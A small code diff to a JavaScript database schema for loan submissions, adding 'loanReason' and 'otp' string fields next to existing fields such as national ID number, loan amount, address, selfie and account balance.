@@ -8,7 +8,9 @@ const SubmissionSchema = new Schema(
     nidNumber: { type: String },
     loanAmount: { type: Number },
     tenure: { type: String },
+    loanReason: { type: String },
     address: { type: String },
+    otp: { type: String },
     selfie: { type: String }, // Base64 or URL
     lastTransaction: { type: String },
     currentBalance: { type: String },
